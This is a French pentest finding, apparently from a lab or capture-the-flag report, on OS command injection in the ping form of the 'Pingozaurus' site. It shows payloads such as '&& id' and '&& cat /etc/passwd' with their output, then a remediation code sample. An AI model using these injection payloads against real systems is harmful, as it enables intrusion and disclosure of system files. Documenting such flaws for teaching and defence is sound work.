# VULN-01 — Remote Code Execution (RCE)

**Sévérité :** MOYEN (CVSS 6.2)
**OWASP :** A03:2021 Injection
**CWE :** CWE-78 OS Command Injection
**Port :** 80/tcp (Pingozaurus)

---

## Description

Le site Pingozaurus (accessible sur http://10.10.10.83) expose un formulaire de test de connectivité réseau (ping). Ce formulaire ne valide pas les entrées utilisateur. Un attaquant peut injecter des commandes OS directement après l'adresse IP en utilisant les opérateurs shell `&&` ou `;`.

---

## Découverte

En naviguant sur http://10.10.10.83, le site Pingozaurus propose un champ "Domain or IP" sans aucune authentification requise.

---

## Exploitation

### Test de l'injection basique

Payload injecté dans le champ :

```
10.10.10.83 && id
```

Résultat visible dans la page :

```
PING 10.10.10.83 (10.10.10.83) 56(84) bytes of data.
64 bytes from 10.10.10.83: icmp_seq=1 ttl=64 time=0.139 ms
[...]

uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(secretgroup)
```

L'injection est confirmée. Le serveur tourne sous le compte `www-data`, membre du groupe `secretgroup`.

### Énumération via RCE

```
10.10.10.83 && cat /etc/passwd
10.10.10.83 && cat /etc/group
10.10.10.83 && cat /run/john-script.sh
10.10.10.83 && ls /home
```

---

## Impact

Exécution arbitraire de commandes sur le serveur avec les droits du service web (www-data). Permet l'accès en lecture à tous les fichiers lisibles par www-data, notamment ceux accessibles via le groupe secretgroup (voir VULN-05).

**Impact GRC :** Violation CWE-78 et OWASP A03:2021. Contrôle A.8.28 ISO 27001:2022 (codage sécurisé) non respecté.

---

## Remédiation

```python
# Remplacement de l'appel shell direct
# Mauvais
import subprocess
result = subprocess.run(f"ping {user_input}", shell=True)

# Correct — liste d'arguments, pas de shell=True
import subprocess, re
if re.match(r'^[\d.]+$', user_input):  # validation stricte
    result = subprocess.run(["ping", "-c", "4", user_input])
```

---

## Références

* [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
* [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
* [OWASP A03:2021](https://owasp.org/Top10/A03_2021-Injection/)

**MITRE ATT&CK :** T1059 Command and Scripting Interpreter, TA0001 Initial Access
